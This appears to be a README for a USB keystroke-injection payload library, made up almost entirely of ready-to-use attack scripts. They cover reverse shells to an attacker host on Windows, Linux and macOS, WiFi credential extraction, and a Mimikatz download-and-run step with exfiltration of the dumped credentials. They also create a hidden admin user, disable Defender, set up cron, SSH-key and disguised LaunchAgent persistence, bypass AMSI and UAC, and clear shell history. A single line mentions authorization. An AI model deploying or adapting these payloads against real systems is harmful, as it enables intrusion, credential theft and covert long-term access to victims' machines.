# ⚔️ MoMo-Mimic Payload Library

> **Version:** 1.0.0 | **Last Updated:** 2025-12-18

---

## 📋 Payload Index

| Category | Payload | OS | Time | Risk |
|----------|---------|-----|------|------|
| **Reconnaissance** | | | | |
| | `recon_system_info.js` | Windows | 8s | Low |
| | `recon_network.js` | Windows | 10s | Low |
| | `recon_users.js` | All | 5s | Low |
| **Credential Theft** | | | | |
| | `cred_wifi_passwords.js` | Windows | 8s | Medium |
| | `cred_browser_dump.js` | Windows | 15s | High |
| | `cred_mimikatz.js` | Windows | 20s | Critical |
| **Reverse Shell** | | | | |
| | `shell_powershell.js` | Windows | 5s | Critical |
| | `shell_bash.js` | Linux | 3s | Critical |
| | `shell_python.js` | All | 4s | Critical |
| **Persistence** | | | | |
| | `persist_user.js` | Windows | 10s | High |
| | `persist_scheduled_task.js` | Windows | 12s | High |
| | `persist_ssh_key.js` | Linux | 6s | High |
| **Exfiltration** | | | | |
| | `exfil_documents.js` | Windows | 30s+ | High |
| | `exfil_clipboard.js` | Windows | 5s | Medium |
| **Utility** | | | | |
| | `util_detect_os.js` | All | 2s | None |
| | `util_test_hid.js` | All | 3s | None |

---

## 🎯 Payload Templates

### Standard Structure

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: [NAME]
// Target:  [Windows/Linux/macOS/All]
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════

// Configuration
layout("us");           // Keyboard layout: us, tr, de, fr, etc.
typingSpeed(0, 0);      // Speed: (min_delay, max_delay) in ms

// ─────────────────────────────────────────────────────────────────────────────
// Phase 1: Initialization
// ─────────────────────────────────────────────────────────────────────────────
delay(2000);            // Wait for USB enumeration

// ─────────────────────────────────────────────────────────────────────────────
// Phase 2: Execution
// ─────────────────────────────────────────────────────────────────────────────
// [Payload code here]

// ─────────────────────────────────────────────────────────────────────────────
// Phase 3: Cleanup
// ─────────────────────────────────────────────────────────────────────────────
delay(500);
press("ALT-F4");        // Close window
```

---

## 🖥️ Windows Payloads

### Reverse Shell (PowerShell)

**File:** `payloads/windows/shell_powershell.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: PowerShell Reverse Shell
// Target:  Windows 10/11
// Time:    ~5 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

// Config - CHANGE THESE
var LHOST = "ATTACKER_IP";
var LPORT = "4444";

delay(2000);

// Open PowerShell (hidden)
press("GUI-r");
delay(500);
type("powershell -w hidden -ep bypass");
press("ENTER");
delay(1500);

// Reverse shell payload
type("$c=New-Object Net.Sockets.TCPClient('" + LHOST + "'," + LPORT + ");");
type("$s=$c.GetStream();[byte[]]$b=0..65535|%{0};");
type("while(($i=$s.Read($b,0,$b.Length)) -ne 0){");
type("$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);");
type("$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';");
type("$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}");
press("ENTER");
```

### WiFi Password Extraction

**File:** `payloads/windows/cred_wifi_passwords.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Extract Saved WiFi Passwords
// Target:  Windows 10/11
// Time:    ~8 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

delay(2000);

// Open PowerShell
press("GUI-r");
delay(500);
type("powershell -w hidden");
press("ENTER");
delay(1500);

// Extract WiFi passwords and save to temp file
type("(netsh wlan show profiles) | Select-String '\\:(.+)$' | ");
type("%{$n=$_.Matches.Groups[1].Value.Trim(); $_} | ");
type("%{(netsh wlan show profile name=$n key=clear)} | ");
type("Select-String 'Key Content\\W+\\:(.+)$' | ");
type("%{$p=$_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{");
type("PROFILE=$n;PASSWORD=$p}} | Format-Table -AutoSize | ");
type("Out-File $env:TEMP\\wifi.txt");
press("ENTER");

delay(2000);

// Exfil via HTTP POST (optional)
// type("Invoke-WebRequest -Uri 'http://ATTACKER_IP/upload' -Method POST -InFile $env:TEMP\\wifi.txt");
// press("ENTER");

delay(500);
press("ALT-F4");
```

### Create Backdoor User

**File:** `payloads/windows/persist_user.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Create Hidden Admin User
// Target:  Windows 10/11 (requires UAC bypass or admin)
// Time:    ~10 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

// Config
var USERNAME = "support$";      // $ at end hides from some tools
var PASSWORD = "P@ssw0rd123!";

delay(2000);

// Open Admin PowerShell
press("GUI-r");
delay(500);
type("powershell Start-Process powershell -Verb runAs");
press("ENTER");
delay(2000);

// Accept UAC (if user is watching)
press("LEFT");
delay(100);
press("ENTER");
delay(1500);

// Create user
type("net user " + USERNAME + " " + PASSWORD + " /add");
press("ENTER");
delay(1000);

// Add to Administrators
type("net localgroup Administrators " + USERNAME + " /add");
press("ENTER");
delay(1000);

// Hide from login screen (registry)
type("reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' /v " + USERNAME + " /t REG_DWORD /d 0 /f");
press("ENTER");

delay(500);
press("ALT-F4");
```

### Mimikatz Credential Dump

**File:** `payloads/windows/cred_mimikatz.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Mimikatz Credential Extraction
// Target:  Windows 10/11 (requires admin + AV evasion)
// Time:    ~20 seconds
// WARNING: Will likely trigger AV without proper evasion
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

// Config
var EXFIL_URL = "http://ATTACKER_IP:8080/upload";

delay(2000);

// Open Admin PowerShell
press("GUI-r");
delay(500);
type("powershell Start-Process powershell -Verb runAs");
press("ENTER");
delay(2000);
press("LEFT");
press("ENTER");
delay(1500);

// AMSI Bypass (basic)
type("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
press("ENTER");
delay(500);

// Download and execute Mimikatz (Invoke-Mimikatz)
type("IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');");
press("ENTER");
delay(3000);

type("Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' | Out-File $env:TEMP\\creds.txt");
press("ENTER");
delay(5000);

// Exfil
type("Invoke-WebRequest -Uri '" + EXFIL_URL + "' -Method POST -InFile $env:TEMP\\creds.txt");
press("ENTER");

delay(1000);
type("Remove-Item $env:TEMP\\creds.txt");
press("ENTER");

delay(500);
press("ALT-F4");
```

### Disable Windows Defender

**File:** `payloads/windows/util_disable_defender.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Disable Windows Defender
// Target:  Windows 10/11 (requires admin)
// Time:    ~12 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

delay(2000);

// Open Admin PowerShell
press("GUI-r");
delay(500);
type("powershell Start-Process powershell -Verb runAs");
press("ENTER");
delay(2000);
press("LEFT");
press("ENTER");
delay(1500);

// Disable Real-time Protection
type("Set-MpPreference -DisableRealtimeMonitoring $true");
press("ENTER");
delay(1000);

// Disable other protections
type("Set-MpPreference -DisableBehaviorMonitoring $true");
press("ENTER");
delay(500);
type("Set-MpPreference -DisableBlockAtFirstSeen $true");
press("ENTER");
delay(500);
type("Set-MpPreference -DisableIOAVProtection $true");
press("ENTER");
delay(500);
type("Set-MpPreference -DisableScriptScanning $true");
press("ENTER");
delay(500);

// Add exclusion for temp folder
type("Add-MpPreference -ExclusionPath $env:TEMP");
press("ENTER");

delay(500);
press("ALT-F4");
```

---

## 🐧 Linux Payloads

### Bash Reverse Shell

**File:** `payloads/linux/shell_bash.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Bash Reverse Shell
// Target:  Linux (with GUI)
// Time:    ~3 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

// Config
var LHOST = "ATTACKER_IP";
var LPORT = "4444";

delay(2000);

// Open terminal (GNOME)
press("CTRL ALT t");
delay(1500);

// Reverse shell
type("bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1 &");
press("ENTER");
delay(500);

// Hide terminal
press("ALT-F4");
```

### SSH Key Persistence

**File:** `payloads/linux/persist_ssh_key.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Add SSH Authorized Key
// Target:  Linux (with GUI)
// Time:    ~6 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

// Your SSH public key
var SSH_KEY = "ssh-rsa AAAA... your_key_here";

delay(2000);

// Open terminal
press("CTRL ALT t");
delay(1500);

// Create .ssh directory if not exists
type("mkdir -p ~/.ssh && chmod 700 ~/.ssh");
press("ENTER");
delay(500);

// Add SSH key
type("echo '" + SSH_KEY + "' >> ~/.ssh/authorized_keys");
press("ENTER");
delay(500);

// Set permissions
type("chmod 600 ~/.ssh/authorized_keys");
press("ENTER");
delay(500);

// Clear history and exit
type("history -c && exit");
press("ENTER");
```

### Cron Backdoor

**File:** `payloads/linux/persist_cron.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Persistent Cron Reverse Shell
// Target:  Linux (with GUI)
// Time:    ~8 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

// Config
var LHOST = "ATTACKER_IP";
var LPORT = "4444";

delay(2000);

// Open terminal
press("CTRL ALT t");
delay(1500);

// Add cron job (every minute)
type("(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1\"') | crontab -");
press("ENTER");
delay(1000);

// Clear history and exit
type("history -c && exit");
press("ENTER");
```

---

## 🍎 macOS Payloads

### Python Reverse Shell

**File:** `payloads/macos/shell_python.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Python Reverse Shell
// Target:  macOS
// Time:    ~4 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

// Config
var LHOST = "ATTACKER_IP";
var LPORT = "4444";

delay(2000);

// Open Terminal via Spotlight
press("GUI-SPACE");
delay(500);
type("terminal");
delay(500);
press("ENTER");
delay(1500);

// Python reverse shell
type("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + LHOST + "\"," + LPORT + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' &");
press("ENTER");
delay(500);

// Close terminal
press("GUI-w");
delay(200);
press("ENTER");
```

### LaunchAgent Persistence

**File:** `payloads/macos/persist_launchagent.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: LaunchAgent Persistence
// Target:  macOS
// Time:    ~10 seconds
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

// Config
var LHOST = "ATTACKER_IP";
var LPORT = "4444";
var LABEL = "com.apple.systemupdate";

delay(2000);

// Open Terminal
press("GUI-SPACE");
delay(500);
type("terminal");
press("ENTER");
delay(1500);

// Create LaunchAgent plist
type("cat > ~/Library/LaunchAgents/" + LABEL + ".plist << 'EOF'");
press("ENTER");
type("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
press("ENTER");
type("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
press("ENTER");
type("<plist version=\"1.0\">");
press("ENTER");
type("<dict>");
press("ENTER");
type("  <key>Label</key><string>" + LABEL + "</string>");
press("ENTER");
type("  <key>ProgramArguments</key>");
press("ENTER");
type("  <array>");
press("ENTER");
type("    <string>/bin/bash</string>");
press("ENTER");
type("    <string>-c</string>");
press("ENTER");
type("    <string>while true; do /bin/bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1; sleep 60; done</string>");
press("ENTER");
type("  </array>");
press("ENTER");
type("  <key>RunAtLoad</key><true/>");
press("ENTER");
type("  <key>KeepAlive</key><true/>");
press("ENTER");
type("</dict>");
press("ENTER");
type("</plist>");
press("ENTER");
type("EOF");
press("ENTER");
delay(500);

// Load the agent
type("launchctl load ~/Library/LaunchAgents/" + LABEL + ".plist");
press("ENTER");
delay(500);

// Clear history
type("history -c && exit");
press("ENTER");
```

---

## 🔧 Utility Payloads

### OS Detection

**File:** `payloads/util/detect_os.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Detect OS and Run Appropriate Payload
// Target:  All
// Time:    ~2 seconds (detection only)
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(0, 0);

delay(2000);

// Try Windows first (most common target)
press("GUI-r");
delay(300);

// If Run dialog opened, it's Windows
// This is detected by subsequent keystrokes working
type("cmd /c echo WINDOWS_DETECTED > %TEMP%\\os.txt & exit");
press("ENTER");

// If we reach here on Windows, command ran
// On Linux/Mac, GUI r does nothing harmful

delay(1000);

// Try Linux
press("CTRL ALT t");
delay(500);
type("echo LINUX_DETECTED > /tmp/os.txt && exit");
press("ENTER");

delay(500);

// Try macOS
press("GUI-SPACE");
delay(300);
press("ESCAPE");

// In practice, use P4wnP1's built-in OS detection
// or check results and run appropriate payload
```

### HID Test

**File:** `payloads/util/test_hid.js`

```javascript
// ═══════════════════════════════════════════════════════════════════════════
// Payload: Test HID Injection
// Target:  All
// Time:    ~3 seconds
// Purpose: Verify device is working
// ═══════════════════════════════════════════════════════════════════════════

layout("us");
typingSpeed(50, 100);  // Human-like speed

delay(2000);

// Windows: Open Notepad
press("GUI-r");
delay(500);
type("notepad");
press("ENTER");
delay(1500);

// Type test message
type("╔════════════════════════════════════════╗");
press("ENTER");
type("║    MoMo-Mimic HID Test Successful!     ║");
press("ENTER");
type("║                                        ║");
press("ENTER");
type("║    If you can read this, the device   ║");
press("ENTER");
type("║    is working correctly.              ║");
press("ENTER");
type("║                                        ║");
press("ENTER");
type("║    Timestamp: " + new Date().toISOString() + "    ║");
press("ENTER");
type("╚════════════════════════════════════════╝");
press("ENTER");
```

---

## 🛡️ Evasion Techniques

### AMSI Bypass Snippets

```javascript
// Method 1: amsiInitFailed
type("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
press("ENTER");

// Method 2: Memory Patch (more reliable)
type("$a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*siUtils'};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like '*Failed'};$b.SetValue($null,$true)");
press("ENTER");
```

### UAC Bypass

```javascript
// Method: fodhelper.exe bypass
type("New-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force");
press("ENTER");
delay(200);
type("Set-ItemProperty 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(default)' -Value 'cmd /c YOUR_COMMAND' -Force");
press("ENTER");
delay(200);
type("Set-ItemProperty 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force");
press("ENTER");
delay(200);
type("Start-Process fodhelper.exe -WindowStyle Hidden");
press("ENTER");
```

### Anti-Detection Delays

```javascript
// Random delay to avoid signature detection
function randomDelay(min, max) {
    delay(Math.floor(Math.random() * (max - min + 1)) + min);
}

// Human-like typing with variable speed
typingSpeed(30, 120);  // 30-120ms between keystrokes

// Pause at natural points
type("command part 1");
randomDelay(200, 500);  // Thinking pause
type(" part 2");
```

---

## 📁 Directory Structure

```
payloads/
├── windows/
│   ├── shell_powershell.js
│   ├── shell_cmd.js
│   ├── cred_wifi_passwords.js
│   ├── cred_browser_dump.js
│   ├── cred_mimikatz.js
│   ├── persist_user.js
│   ├── persist_scheduled_task.js
│   ├── persist_registry.js
│   ├── util_disable_defender.js
│   └── util_uac_bypass.js
├── linux/
│   ├── shell_bash.js
│   ├── shell_python.js
│   ├── persist_ssh_key.js
│   ├── persist_cron.js
│   └── recon_system.js
├── macos/
│   ├── shell_python.js
│   ├── persist_launchagent.js
│   └── recon_system.js
├── util/
│   ├── detect_os.js
│   ├── test_hid.js
│   └── keyboard_test.js
└── custom/
    └── .gitkeep
```

---

## ⚠️ Usage Guidelines

1. **Always test in lab environment first**
2. **Modify IP addresses and passwords before deployment**
3. **Consider keyboard layout of target system**
4. **Add appropriate delays for target system speed**
5. **Have proper authorization before any testing**

---

*MoMo-Mimic Payload Library v1.0.0*

